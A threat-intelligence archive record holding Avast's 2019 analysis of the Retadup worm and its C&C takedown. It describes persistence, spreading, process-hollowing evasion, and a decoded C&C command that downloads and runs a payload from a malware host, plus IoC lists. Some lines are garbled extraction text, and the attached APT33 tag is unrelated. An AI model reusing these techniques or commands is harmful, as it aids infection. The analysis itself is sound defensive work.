{
    "id": "2337205d-b382-4c61-87b7-ecc23b81c269",
    "created_at": "2023-01-12T14:59:47.420814Z",
    "updated_at": "2025-03-27T02:16:59.296265Z",
    "deleted_at": null,
    "sha1_hash": "50b267b1c4570bb99d78ad192d54d74a8f39f0b8",
    "title": "2019-08-28 - Putting an end to Retadup- A malicious worm that infected hundreds of thousands",
    "authors": "",
    "file_creation_date": "2022-05-29T01:17:40Z",
    "file_modification_date": "2022-05-29T01:17:40Z",
    "file_size": 1026978,
    "plain_text": "# Putting an end to Retadup: A malicious worm that infected hundreds of thousands\n\n**[decoded.avast.io/janvojtesek/putting-an-end-to-retadup-a-malicious-worm-that-infected-hundreds-of-thousands/](https://decoded.avast.io/janvojtesek/putting-an-end-to-retadup-a-malicious-worm-that-infected-hundreds-of-thousands/)**\n\nAugust 28, 2019\n\nby [Jan VojtěšekAugust 28, 201927 min read](https://decoded.avast.io/author/janvojtesek/)\n\nRetadup is a malicious worm affecting Windows machines throughout Latin America. Its objective is to achieve persistence on its victims’\ncomputers, to spread itself far and wide and to install additional malware payloads on infected machines. In the vast majority of cases, the\ninstalled payload is a piece of malware mining cryptocurrency on the malware authors’ behalf. However, in some cases, we have also\nobserved Retadup distributing the Stop ransomware and the Arkei password stealer.\n\n[We shared our threat intelligence on Retadup with the Cybercrime Fighting Center (C3N) of the French National Gendarmerie, and proposed](https://www.gendarmerie.interieur.gouv.fr/pjgn/SCRCGN/Le-centre-de-lutte-contre-les-criminalites-numeriques-C3N)\na technique to disinfect Retadup’s victims. In accordance with our recommendations, C3N dismantled a malicious command and control\n(C&C) server and replaced it with a disinfection server. The disinfection server responded to incoming bot requests with a specific response\nthat caused connected pieces of the malware to self-destruct. At the time of publishing this article, the collaboration has neutralized over\n850,000 unique infections of Retadup.\n\nThis article will begin with a timeline of the disinfection process. Later sections will contain more technical details about Retadup itself and the\nmalicious miner that it’s distributing.\n\nA map illustrating\n\nthe amount of neutralized Retadup infections per country. Most victims of Retadup were from Spanish-speaking countries in Latin America.\n\n## Timeline\n\n\n-----\n\ne t oug e e ad detect o s g atu es o etadup be o e, e o y sta ted o to g ts act ty c ose y a c 0 9 s a pa t o ou\nthreat intelligence research, we always actively hunt malware that utilizes advanced techniques in an attempt to bypass our detection. At the\ntime, a malicious Monero cryptocurrency miner piqued our interest because of its advanced stealthy process hollowing implementation. We\nstarted looking into how this miner is distributed to its victims and discovered that it was being installed by an AutoIt/AutoHotkey worm called\nRetadup.\n\nAfter analyzing Retadup more closely, we found that while it is very prevalent, its C&C communication protocol is quite simple. We identified a\ndesign flaw in the C&C protocol that would have allowed us to remove the malware from its victims’ computers had we taken over its C&C\nserver. This made it possible to put an end to Retadup and protect everyone from it, not just Avast users (note that while it is often possible to\nclean malware infections by taking over a C&C server and pushing a “malware removal” script to the victims through the malware’s\nestablished arbitrary code execution channel, the design flaw we found did not involve making the victims execute any extra code).\n\nRetadup’s C&C infrastructure was mostly located in France so we decided to contact the French National Gendarmerie at the end of March to\nshare our findings with them. We proposed a disinfection scenario that involved taking over a C&C server and abusing the C&C design flaw in\norder to neutralize Retadup. They liked our idea and have opened a case on Retadup.\n\nWhile the Gendarmerie was presenting the disinfection scenario to the prosecutor, we were busy analyzing Retadup in more detail. We\ncreated a simple tracker program that would notify us whenever there was either a new variant of Retadup or if it started distributing new\nmalicious payloads to its victims. We then tested the proposed disinfection scenario locally and discussed potential risks associated with its\nexecution. The Gendarmerie also obtained a snapshot of the C&C server’s disk from its hosting provider and shared parts of it with us so we\ncould start to reverse engineer the contents of the C&C server. For obvious privacy reasons, we were only given access to parts of the C&C\nserver that did not contain any private information about Retadup’s victims. Note that we had to take utmost care not to be discovered by the\nmalware authors (while snapshotting the C&C server and while developing the tracker). Up to this point, the malware authors were mostly\ndistributing cryptocurrency miners, making for a very good passive income. But if they realized that we were about to take down Retadup in\nits entirety, they might’ve pushed ransomware to hundreds of thousands of computers while trying to milk their malware for some last profits.\n\nThe findings from the analysis of the obtained snapshot of the C&C server were quite surprising. All of the executable files on the server were\ninfected with the Neshta fileinfector. The authors of Retadup accidentally infected themselves with another malware strain. This only proves a\npoint that we have been trying to make – in good humor – for a long time: malware authors should use robust antivirus protection. Avast\nAntivirus would have protected them from Neshta. As a side effect, it may also have protected them (and others) from their own malware.\n[Alternatively, they also could have used our free Neshta removal tool.](https://www.avg.com/en-ww/remove-win32-neshta)\n\nAvast’s detection dialog for an executable binary from\n\nthe C&C server. Apanas is an alias for Neshta based on a string contained in Neshta binaries.\nIn July 2019, the Gendarmerie received the green light from the prosecutor, meaning they could legally proceed with the disinfection. They\nreplaced the malicious C&C server with a prepared disinfection server that made connected instances of Retadup self-destruct. In the very\nfirst second of its activity, several thousand bots connected to it in order to fetch commands from the server. The disinfection server\nresponded to them and disinfected them, abusing the C&C protocol design flaw.\n\nSome parts of the C&C infrastructure were also located in the US. The Gendarmerie alerted the FBI who took them down, and on July 8 the\nmalware authors no longer had any control over the malware bots. Since it was the C&C server’s responsibility to give mining jobs to the bots,\nnone of the bots received any new mining jobs to execute after this takedown. This meant that they could no longer drain the computing\npower of their victims and that the malware authors no longer received any monetary gain from mining.\n\nThe Retadup bots sent quite a lot of information about the infected machines to the C&C server. Since we had limited access to a snapshot of\nthe server, we were able to obtain some aggregated information about Retadup’s victims. The most interesting piece of information for us was\nthe exact amount of infections and their geographical distribution. To date, we have neutralized over 850,000 unique infections of Retadup,\nwith the vast majority located in Latin America Since the malware authors mined cryptocurrency on the victims’ computers they were\n\n\n-----\n\natu a y te ested t e co put g po e o ected ac es e e e ab e to dete e t at t e ost ected co pute s ad e t e t o\nor four cores (the average number of infected computer cores was 2.94) and that the majority of victims used Windows 7. Over 85% of\nRetadup’s victims also had no third-party antivirus software installed. Some also had it disabled, which left them completely vulnerable to the\nworm and allowed them to unwittingly spread the infection further. Because we are usually only able to protect Avast users, it was very\nexciting for us to also help protect the rest of the world from malware on such a massive scale.\n\nA pie chart illustrating the distribution of Retadup’s\n\nvictims by operating system version.\n\n**Bragging anonymously on Twitter**\n\nDespite hundreds of thousands of machines infected by Retadup, it seems like the worm never got the attention it warranted from the security\n[community. Trend Micro published a series of](https://blog.trendmicro.com/trendlabs-security-intelligence/information-stealer-found-hitting-israeli-hospitals/) [technical](https://blog.trendmicro.com/trendlabs-security-intelligence/new-retadup-variants-hit-south-america-turn-cryptocurrency-mining/) [articles on Retadup back in 2017 and 2018. Interestingly, the authors of Retadup](https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-retadup-worm-goes-polymorphic-gets-an-autohotkey-variant/)\n[decided to brag about their malware on Twitter. They created a throwaway Twitter account @radblackjoker and responded to Trend Micro’s](https://twitter.com/radblackjoker)\nresearch on Retadup with exclamations such as `Its my baby <3 or` `its my worm i invented it hehehe :D i will rule the world`\n```\nsoome day :( . In one case, the authors even responded with a screenshot showing the C&C controller. At first, we had some doubts about\n\n```\nthe legitimacy of this Twitter account, but after we obtained the source code of Retadup’s C&C components, it became clear that this\nscreenshot, and consequently the Twitter account, were genuine.\n\n\n-----\n\nA tweet by Retadup’s author showing a\n\nscreenshot of the malware’s control panel. Note that since there were multiple variants of Retadup (each with its own separate control panel),\nthis control panel displays information about only one variant of Retadup, so the real number of bots is much higher than what is shown here.\nSince no instructions on how to remove Retadup were available from the security industry, [plenty](https://www.youtube.com/watch?v=uh5xNQXQhps) [of](https://www.youtube.com/watch?v=6H91XhoQcMo) [independent](https://www.youtube.com/watch?v=TdbaSLCA26k) [removal](https://www.youtube.com/watch?v=OWwoCKCc2rE) [tutorials emerged](https://www.youtube.com/watch?v=a3vh_cxQrRg)\nonline. On YouTube, the top five Retadup removal instructional videos have over 250,000 views combined. Given the geographical\ndistribution of Retadup infections, it is not surprising that they are mostly in Spanish. While these tutorials usually deal with just one specific\nvariant of Retadup, the instructions given in them should work fairly well, and they appeared to help a lot of people. Unfortunately, these\ntutorials only deal with AutoIt variants of Retadup. There are also other variants, which are written in AutoHotkey, for which we found no\n[tutorials. This is probably because the malware in Autolt variants is saved under filenames that are easily searchable, so it’s easy for victims](https://github.com/avast/ioc/blob/master/Retadup#file-names)\nto find a removal tutorial. On the other hand, almost every string in AutoHotkey variants is randomized, so victims most likely do not know\nhow and where to look for help.\n\n## Technical details\n\n**AutoIt/AutoHotkey core**\n\nSince Retadup has been under active development for years now, there are many different variants of its core in the wild. Most of these\nvariants are very similar in functionality and only differ in how the functionality is implemented. The core is written in either AutoIt or\nAutoHotkey. In both cases, it consists of two files: the clean scripting language interpreter and the malicious script itself. This is in contrast to\nmost AutoIt malware strains nowadays which are generally composed of just a single malicious executable that contains both the interpreter\nand the malicious script. In AutoHotkey variants of Retadup, the malicious script is distributed as source code, while in AutoIt variants, the\nscript is first compiled and then distributed. Fortunately, since the compiled AutoIt bytecode is very high-level, it is not that hard to decompile it\ninto a more readable form.\n\nThe core follows the same simple workflow in most variants. First, it checks if another instance of Retadup is already running. If it is, then it\nexits silently so that only a single instance of Retadup is running at any given time. Then it makes some basic checks to see if it is being\nanalyzed. If it detects that it is under analysis, it also exits silently. Subsequently, it achieves persistence and attempts to spread itself. Finally,\n\n\n-----\n\nt e te s a te oop c t egu a y po s t e C&C se e o co a ds a d t ece es a co a d o t e C&C, t e ecutes a\nhandler for the received command. While contacting the C&C, it also periodically performs other attempts to spread itself and restores its\npersistence mechanisms.\n\nThere are many anti-analysis checks and their specific implementation differs in various Retadup variants. Almost all Retadup samples first\ncheck the filesystem path they are running from. If either the interpreter path or the script path differs from what is expected, the script doesn’t\ncarry out any malicious actions. Most samples also implement a way to delay their execution. At the start of their execution, they either\nperform a single long sleep or a series of many short sleeps. Finally, some variants also check if processes with names such as\n```\nvmtoolsd.exe or procmon.exe are running, if directories with names such as C:\\CWSandbox\\ or C:\\cuckoo\\ exist and if modules\n\n```\nwith names such as `SbieDll.dll or` `api_log.dll are loaded in the current process.`\n\nRetadup’s anti-analysis tricks. This particular sample expects to be stored\n\nin a path such as `C:\\fcdurarluwwzawbwjwhcv\\vumrjearhgatsbrqeesyz.txt and will do nothing malicious if it detects that it’s running`\nfrom a path that is obviously different.\nRetadup achieves persistence by either creating a registry value in `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and/or`\ncreating a scheduled task. The scheduled task is created using the `schtasks.exe utility and is set to execute every minute. AutoIt variants`\n[of Retadup typically use hardcoded registry value names, while AutoHotkey variants tend to use both registry values and scheduled tasks](https://github.com/avast/ioc/blob/master/Retadup#registry-keys)\nwith randomly generated names.\n\nPersistence mechanisms established by an\n\nAutoHotkey sample of Retadup.\n\n\n-----\n\netadup p a y sp eads by d opp g a c ous es o to co ected d es e t s sp ead g, etadup te ates o e a co ected\ndrives where the assigned letter is not `C . Then it goes through all folders that are located directly in the root folder of the currently-selected`\ndrive. For each folder, it creates a `LNK file that is supposed to mimic the real folder and trick users into executing it. The` `LNK file is created`\nunder the same name as the original folder, with only a short string such as `copy fpl.lnk appended to it. Retadup also copies both the`\nclean AutoIt/AutoHotkey interpreter and the malicious script to a hidden/system directory, located at a hardcoded path relative to the dropped\n```\nLNK file. When executed, the LNK file will then run the malicious script using the dropped AutoIt/AutoHotkey interpreter. The dropped LNK\n\n```\nfiles essentially mimic users’ already existing files and they seem to be successful at convincing many of them that they are just benign\nshortcuts. We have received hundreds of erroneous false positive reports on malicious `LNK files created by Retadup.`\n\nAn example of Retadup’s spreading mechanism. The `LNK file will run the malware from the hidden/system folder when executed.`\nEach sample of Retadup is configured with a set of C&C domain names and ports. The sample contacts them individually by making an\nHTTP GET request to them. Every time such a request is made, the sample encodes some information about the victim in the path of the\nrequested URL. While the exact content and form of the encoded information varies in different variants of Retadup, all variants of Retadup\nencode a victim’s ID at the start of the path. For example, one AutoHotkey sample in our testing environment sent a request to:\n```\nhttp://newalpha.alphanoob[.]com:9898/4D7A51334E5459314D6A453356306C/1/54576C6A636D397A62325A3049466470626D527664334D67\n\n```\nIn this example, most parts of the URL path are encoded using a combination of Base64 and hexadecimal encoding (the sample uses custom\nBase64 implementation and in some cases adds some extra padding so it does not strictly adhere to the Base64 specification). After\ndecoding, the path would look like:\n```\nhttp://newalpha.alphanoob[.]com:9898/347565217WI/1/Microsoft Windows 7 Ultimate/DESKTOP-0123456/test/rad//0/0\n\n```\n\nIn the above “decoded” URL, `347565217WI is the victim’s ID (which is just the hard disk serial number concatenated with Windows version`\ntruncated to a fixed length), `1 is the version of Retadup,` `Microsoft Windows 7 Ultimate is the OS caption,` `DESKTOP-0123456 is the`\ncomputer name, `test is the username,` `rad is the malware distributor’s ID, the next field contains the installed AV software (there was`\nnone on the malware analysis machine), the penultimate `0 means that the malware is not actively spreading, and the last` `0 means that`\nthe miner component is not running.\n\nAn example capture of C&C communication.\nThe C&C server parses the information from the path of the received GET request and sends back a similarly obfuscated HTTP response\nthat contains the command to execute. The exact encoding of the response varies in different variants of Retadup, but let’s see an example\nresponse that the C&C sent to the most prevalent AutoHotkey variant.\n```\n::623274386648783849475276643235736232466b4c576830644841364c7939356257466b4c6e566e4c33526c633342305979396a617938314e44\n\n```\nAfter decoding it similarly to the HTTP request, we get:\n```\nok|||| download-http://ymad[.]ug/tesptc/ck/5475.exe:!:soso.exe-download\n\n```\n\nThis command instructs the victim to download a file from `http://ymad[.]ug/tesptc/ck/5475.exe, drop it into the malware’s folder under`\nthe filename `soso.exe and execute it. Most of the commands contain a prefix and suffix that identify the command ( download- and` `-`\n```\ndownload in the above case) and the command arguments are enclosed between them separated by the :!: delimiter. For some reason,\n\n```\nthe suffix for the update command is `-update in some variants and` `-updatee in others.`\n\nThe set of supported commands is currently pretty small – there used to be more of them in older variants. The authors probably realized that\nthey do not need the other commands and wanted to keep their malware simpler. The most prevalent commands currently are:\n```\n   Update: downloads a newer variant of Retadup and replaces the previous variant of Retadup with it\n\n```\n\n-----\n\n`o` `oad` do oads a d e ecutes a add t o a pay oad e t e a uto t/ uto ot ey sc pt o a e\n```\n   Sleep: causes the malware to wait for a specified amount of time\n   Updateself: causes the script to polymorphically mutate itself (it prepends a single random comment line and renames some of its\n\n```\nobfuscated variable names)\n\nThe way that the download command executed additional PE payloads often used multiple layers of indirection. Instead of downloading and\nexecuting the PE payload directly, an AutoIt script was fetched first. Embedded in the AutoIt script was a shellcode capable of loading an\nembedded PE file. The shellcode was copied into executable memory allocated through `VirtualAlloc . The AutoIt function`\n```\nDllCallAddress was then used to transfer control to the shellcode which in turn loaded and passed control to the final PE payload. The\n\n```\npurpose of this indirection was presumably to avoid dropping the PE payload to disk, which would have increased the chance of detection.\nBut the above-described workflow was not used exclusively. In some other cases, we’ve also observed the AutoIt script directly downloading\na PE file, deleting its zone identifier and running it directly from disk.\n\n[Before the execution of some payloads, we’ve also observed Retadup attempting to abuse known UAC bypass methods.](https://github.com/hfiref0x/UACME/blob/ff1445ad3131bf50f1a04aae4447ba7ea0697218/Source/Akagi/methods/enigma0x3.c#L568)\n\nDeobfuscated UAC bypass code\n\nfound in Retadup.\nSince the core is distributed either in the form of AutoHotkey source code or AutoIt bytecode (which is easy to decompile), the authors tried to\nobfuscate it to make analysis harder. For the most part, they used publicly available AutoIt/AutoHotkey obfuscators. The hardest one for us to\ndeobfuscate was CodeCrypter. CodeCrypter encrypts strings with AES. AES decryption is performed by a custom shellcode (there is both a\n32-bit and a 64-bit variant). The shellcode is loaded into the memory of the AutoIt interpreter process. Since it is embedded in the script in a\ncompressed form, it is first decompressed by another shellcode – this time it is code from the popular aPLib decompression library. The AES\nkey used to encrypt strings is further obfuscated and encrypted with another key. The way that CodeCrypter calls the shellcode is interesting\n– it uses the `CallWindowProc function from` `user32.dll as a trampoline. CodeCrypter calls it and passes the address of the shellcode to`\ncall as its first argument. `CallWindowProc internally calls the address pointed to by its first argument and passes the following arguments to`\nit, so this is a nice way to call arbitrary native code without using suspicious AutoIt functions such as `DllCallAddress . CodeCrypter also`\nrenames all variables and user-defined functions to random-looking strings. All of these new names also share the same prefix and suffix\nwhich makes it visually difficult to tell them apart without renaming them.\n\n\n-----\n\nAn example piece of Retadup’s code protected by CodeCrypter.\n\n**C&C server**\n\nFor malware researchers, the C&C server is always a big black box. Each piece of code on the client can be reverse-engineered and\nunderstood, but while we can get a pretty good idea about what’s happening on the C&C server, it is usually impossible to fully understand its\nserver-side logic. For this reason, we were very excited when the Gendarmerie shared the code of Retadup’s C&C controller with us. We\ndidn’t get a full dump of the contents of the server, so it wasn’t possible to do any computer forensics, but we could learn a lot about the\nmalware by reverse-engineering the controller.\n\nThe first thing that interested us, was whether there were any server-side anti-analysis checks. These are usually pretty annoying since they\ncan hinder us from analyzing the C&C from outside or even deliberately cause the C&C to present false information to us. It turned out that\nthe malware authors didn’t bother implementing any such anti-analysis tricks. The only thing that hindered our analysis was that the server\nkept track of which commands were sent to which victims and only sent each command to each victim once.\n\n[The C&C server is implemented in Node.js and information about the victims is stored in a MongoDB database. There are eleven distinct](https://nodejs.org/)\nversions of the C&C server each in its own folder, with its own database, listening on its own port, commanding a single variant of Retadup.\nEach version also contains its own controller, which is basically just a GUI written in Node.js that allows the malware operators to give\ncommands to the bots and shows some statistics about the victims.\n\n\n-----\n\nA screenshot of the C&C panel.\n\nOn each GET request from a malware bot, the C&C first looks up the ID of the victim in its database. If it is not already there, it creates a new\nrecord for it. Then it stores the information from the URL path to the database. It also saves the victim’s IP address, country (identified by the\nIP address) and the current time. Afterwards, it looks at the victim’s `lcmid . This field contains the creation time of the last command that`\nwas sent to the victim. Next, it looks if it has a newer command for the bot than the one identified by its `lcmid . If it discovers one, the newer`\ncommand gets sent to the victim. Otherwise, just a simple `sleep command is sent.`\n\nInterestingly, the server also accepted GET requests to path `/rad (which seems to be a nickname of one of the malware authors) and it`\nresponded with the number of victims that are from Peru.\n\nCode of Retadup’s controller sending an\n\nHTTP response with the number of “clients” (read “victims”) from Peru. Interestingly, this part of the controller was for some reason internetfacing, so anyone could’ve queried this number when the server was still live.\nThe authors probably weren’t sure where they stood in the tabs versus spaces argument so both tabs and spaces were used in the controller.\nSometimes, the indentation of source code was so bad that it would enrage even the most forgiving software engineers.\n\n\n-----\n\nAn actual piece of Retadup’s controller’s code with all whitespace left exactly as we found it.\nThe C&C server also contained a .NET controller for an AutoIt RAT called HoudRat. Looking at samples of HoudRat, it is clear that HoudRat\nis just a more feature-rich and less prevalent variant of Retadup. HoudRat is capable of executing arbitrary commands, logging keystrokes,\ntaking screenshots, stealing passwords, downloading arbitrary files and more.\n\nA\n\nscreenshot of HoudRat’s controller.\nWe also found that XMRig Proxy was running on the server on ports 9556, 667 and 666 (infecting hundreds of thousands of unwitting victims\nprobably wasn’t devilish enough). As its name suggests, XMRig Proxy proxies traffic between the miner bots and a mining pool. It\nconsolidates traffic from multiple bots, so to the mining pool it seems like there’s only a couple of workers. At the time the C&C server\nsnapshot was taken, the malware authors mined in the `minexmr.com mining pool (but from other saved XMRig config files it is clear that`\nthey also experimented with `pool.supportxmr.com,` `nicehash.com,` `xmrpool.net,` `pool.minergate.com and` `minexcash.com ).`\nWhile Monero is designed to be untraceable, mining pools often publish an API that allows anyone to see how much has a given miner made.\nSince the pool username is often selected as a Monero destination address (in this case it was\n```\n4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQp35WaoCS1UURfQP9z ), we can\n\n```\nsee that the malware authors mined 53.72 XMR (~4,200 USD at the time of publishing this article) during the near month that the above\naddress was active. Note that they might have mined for other pools with the other proxies as well during the same period, so the real profits\nfrom mining were likely higher.\n\n\n-----\n\nA screenshot illustrating Retadup’s mining power in March 2019.\n\n**Miner payload**\n\nThe miner payload comes as a 32-bit PE file and is often packed with various packers/crypters. To keep this blog post shorter, we focus on\nthe unpacked sample `9c46a0e48ea9b104f982e5ed04735b0078938866e3822712b5a5374895296d08, but there are also other variants of the`\nminer that are slightly different. The general functionality of this payload is pretty much what we have come to expect from common malicious\nstealthy miners. It decrypts an XMRig PE file in memory and injects it into a newly-created process via process hollowing. It also dynamically\nbuilds an XMRig config file, drops it to disk and passes it to the newly-created process. XMRig’s `donate-level is set to 0 so as not to share`\nany mining profits with XMRig developers. The malware also avoids mining when `taskmgr.exe is running so that it is harder for users to`\ndetect its increased CPU usage. The process that injects XMRig also acts as a watchdog. If the injected worker process is terminated for any\nreason, the watchdog process spawns a new worker process to replace it.\n\n\n-----\n\nThe miner\n\nprocess ( wuapp.exe ) exits when Task Manager is opened and starts again when Task Manager is closed. Also note how the watchdog\nprocess ( retadup_miner.exe ) promptly restarts the miner process when it is killed.\nAs was already mentioned, the most interesting aspect about this miner from our perspective was the injection method. At a high enough\nlevel, the injection is just regular process hollowing. A suspended process is created, its original sections are unmapped, the injected PE file\nis mapped instead (with its relocations and imports resolved) and the process is resumed. However, while process hollowing is often\nimplemented by calling higher-level functions such as `WriteProcessMemory or` `NtMapViewOfSection, the miner opts for an extra stealthy`\nway of using system calls directly. This is much harder to implement than regular process hollowing, but it probably allows the authors to\nbypass userland hooks of some security solutions.\n\nMost regular implementations of process hollowing directly use undocumented functions exported from `ntdll (such as`\n```\nNtUnmapViewOfSection ) to achieve process injection. However, many endpoint security solutions are able to detect this method of injection\n\n```\n[by hooking well-known functions. Therefore, some pieces of malware (such as Formbook) load a second copy of](https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html) `ntdll into its memory and`\ncall functions exported from `ntdll through this copy (this is also known as the “Lagos Island” method). The idea behind this is that the new`\ncopy of `ntdll (which is often read directly from disk) might not contain the hooks that the original copy did contain, so that security software`\nmight not see which functions the malware called.\n\nThe above-described “Lagos Island” method of using a fresh unhooked copy of `ntdll is used in this miner, but it also goes one step further.`\nFunctions related to process hollowing are not called through the copy of `ntdll . Instead, the miner parses the body of those functions and`\nextracts their corresponding syscall numbers (on Windows, system call numbers can change between versions, so they cannot simply be\nhardcoded in the sample). Once the malware has the necessary syscall number, it just calls the syscall directly using the\n```\nsysenter instruction.\n\n```\nA shortcut to kernel mode bypassing `ntdll .`\n\n\n-----\n\ns s poss b e s ce ost o t e used `td` u ct o s a e just s p e appe s a ou d t e sysca e esu t o t s s t at t e a a e\ndoesn’t call any exported functions, so regular userland hooks will probably not intercept the usage of these “functions”.\n\nRetadup’s implementation of `NtResumeThread . Note how the syscall is performed differently based on the bitness of the operating system.`\nSince the miner is a 32-bit PE file, the above-described method works well on 32-bit systems. But what about WoW64? Surely the miner\n[cannot just call 64-bit syscalls from 32-bit code. Instead, it uses the so-called Heaven’s Gate technique to break out of the WOW64 emulation](http://rce.co/knockin-on-heavens-gate-dynamic-processor-mode-switching/)\nlayer. Once the malware is through the Heaven’s Gate and is executing 64-bit code, it can call a 64-bit syscall directly and then return back to\n32-bit code. The usage of the Heaven’s Gate technique also allows the miner to inject the 64-bit version of XMRig from within the WoW64\nsubsystem.\n\n\n-----\n\nThe miner’s transition to 64-bit\n\ncode through the Heaven’s gate.\nThe miner itself doesn’t use any special obfuscation (the authors probably assumed that the crypters they’ve used will suffice). However, the\ncode where the XMRig config file is created contains strings encrypted with Vigenère cipher using a hardcoded key. This seems like a basic\neffort to make it slightly harder to repurpose the miner. Otherwise, it would be trivial for other malware authors to patch the address that\nreceives the mining income and use the miner for their own nefarious purposes.\n\n### IoCs\n\n**Network indicators**\n\n**C&C domains (no longer malicious)**\n\nalphanoob[.]com\n\nnewalpha.alphanoob[.]com\n\nnewblackage[.]com\n\nnoobminer.newblackage[.]com\n\nnewminersage[.]com\n\nnewminer.newminersage[.]com\n\nnewage.newminersage[.]com\n\nsuperuser.newminersage[.]com\n\nsuperlover.newminersage[.]com\n\nblackjoker.newminersage[.]com\n\nsuperalpha.newminersage[.]com\n\nnewghoul2019.newminersage[.]com\n\n\n-----\n\nradnewage[.]com\n\nnewage.radnewage[.]com\n\nsuperalpha.radnewage[.]com\n\nnewghoul2019.radnewage[.]com\n\nminernewage[.]com\n\nnewage.minernewage[.]com\n\nmdwnte[.]com\n\nrad2016.publicvm[.]com\n\nhellothere.publicvm[.]com\n\nradjoker2.publicvm[.]com\n\nnoobminer.publicvm[.]com\n\nradpal.publicvm[.]com\n\nnewalpha.super-gamezer[.]com\n\nroro2016.linkpc[.]net\n\n[https://github.com/avast/ioc/blob/master/Retadup#network-indicators](https://github.com/avast/ioc/tree/master/Retadup#network-indicators)\n\n**Malware samples**\n\nAutoIt/AutoHotkey core\n\na8ccb0a1c70975a1f34d0c40784e259e4c62c2533177f84ecd953c03106dd77e\n\nb4d8d7cbec7fe4c24dcb9b38f6036a58b765efda10c42fce7bbe2b2bf79cd53e\n\nc69811d8574fcc59e37fe2cbf0a31be4956ab81c3279bfb1351ff6da3417b4a7\n\n668dafd68f33c589d0ceefac1d312632a64b2f5798e29a4701bf535a82251cc8\n\n4a25606cdbdc75231e773637186ae312f34fa8f9c8ad6f296b4af4c57e44f1db\n\n91b75ccd19e045c24eec0399bdf4ab504fc8ecee2514f16b29d50c2967d2ad87\n\nAutoIt loaders\n\n94cdce276447b3339dcf90c90c05faa324fa7f5cc022d0f0538ff01e0a86486c\n\nfb722e9df7c2c4dbade734c41f810699d8eb19573b05cb55fa235065ba545133\n\n2bed949f0cfe04b88b75bac404dc191b24d224deead993a3c82f15fad88a39c8\n\nAutoIt/AutoHotkey interpreters (not malicious by themselves)\n\n77c2372364b6dd56bc787fda46e6f4240aaa0353ead1e3071224d454038a545e\n\n1b5e7860c517ad4c70eb750e0f0eecd43a1cf90df3adc4b5195242ef8944e9e1\n\n8498900e57a490404e7ec4d8159bee29aed5852ae88bd484141780eaadb727bb\n\nHoudRat\n\n940bef003d57e3ef78fb7dd9ed0bb528611164dd663db80aa6d875a8b8688ef4\n\nRetadup miner\n\n9c46a0e48ea9b104f982e5ed04735b0078938866e3822712b5a5374895296d08\n\n36820a9c9e7b22a069fe897e3a82e05efad888150c0a91a6ef93fb139c702093\n\n000506b6fb0d6e608910584d9b7d7b5da7105755b203a390087bf4637147e244\n\n\n-----\n\n000e3af1ec99f4ce7269cc734d164e2c5a34a396f03c7a0190e46f47ccf0bf07\n\n000e4f56bff7202d9741e435073e020ec74a02ec641555aab7a0d448354512d1\n\n00154ca809565b7b65e72a17735efb86c0134539b8591f95e926aed3d4954426\n\nStop ransomware\n\n6a6a632e98e89a20b910961ba898cafb6651e88ee39187585be06496a31d5fc8\n\nArkei password stealer\n\n7bdf91007e233bc49cb8837c2d098a0cdb00c20e5a925181fe8d5d12153d36ca\n\n[https://github.com/avast/ioc/blob/master/Retadup#samples-sha-256](https://github.com/avast/ioc/tree/master/Retadup#samples-sha-256)\n\n**Mutexes**\n\n[https://github.com/avast/ioc/blob/master/Retadup#mutexes](https://github.com/avast/ioc/tree/master/Retadup#mutexes)\n\n**File names**\n\n[https://github.com/avast/ioc/blob/master/Retadup#file-names](https://github.com/avast/ioc/tree/master/Retadup#file-names)\n\n**Registry keys**\n\n[https://github.com/avast/ioc/blob/master/Retadup#registry-keys](https://github.com/avast/ioc/tree/master/Retadup#registry-keys)\n\n[Tagged ascoinminer,](https://decoded.avast.io/tag/coinminer/) [cryptomining,](https://decoded.avast.io/tag/cryptomining/) [malware,](https://decoded.avast.io/tag/malware/) [takedown,](https://decoded.avast.io/tag/takedown/) [worm](https://decoded.avast.io/tag/worm/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-28 - Putting an end to Retadup- A malicious worm that infected hundreds of thousands.pdf"
    ],
    "report_names": [
        "2019-08-28 - Putting an end to Retadup- A malicious worm that infected hundreds of thousands.pdf"
    ],
    "threat_actors": [
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b938e2e3-3d1b-4b35-a031-ddf25b912557",
            "created_at": "2022-10-25T16:07:23.35582Z",
            "updated_at": "2025-03-27T02:02:09.750954Z",
            "deleted_at": null,
            "main_name": "APT 33",
            "aliases": [
                "APT 33",
                "ATK 35",
                "Cobalt Trinity",
                "Curious Serpens",
                "Elfin",
                "Holmium",
                "Magnallium",
                "Peach Sandstorm",
                "Refined Kitten",
                "TA451",
                "Yellow Orc"
            ],
            "source_name": "ETDA:APT 33",
